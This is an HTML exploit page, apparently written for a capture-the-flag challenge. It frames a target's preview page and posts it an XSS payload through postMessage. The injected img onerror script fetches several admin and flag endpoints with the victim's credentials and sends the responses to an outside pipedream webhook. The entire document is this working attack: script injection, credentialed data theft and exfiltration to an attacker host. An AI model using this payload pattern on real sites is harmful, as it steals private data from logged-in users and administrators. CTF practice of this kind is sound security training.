<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://b753857f-9748-4d5a-b219-43fbbefb0c2e.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const endpoints = [
              '/admin/api/flag',
              '/admin/flag',
              '/api/admin/flag',
              '/admin/api/messages',
            ];
            
            const payload = `<img src=x onerror="
              (async function() {
                var WEBHOOK = '${WEBHOOK}';
                var endpoints = ['/api/flag', '/flag', '/admin/api/flag', '/admin/flag', '/api/admin/flag'];
                var results = [];
                
                for (var i = 0; i < endpoints.length; i++) {
                  var res = await fetch(endpoints[i], {credentials:'include'});
                  var text = await res.text();
                  results.push({ep: endpoints[i], status: res.status, text: text});
                  await new Promise(function(resolve){ setTimeout(resolve, 500); });
                }
                
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  keepalive: true,
                  body: JSON.stringify(results)
                });
              })();
            ">`;

            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
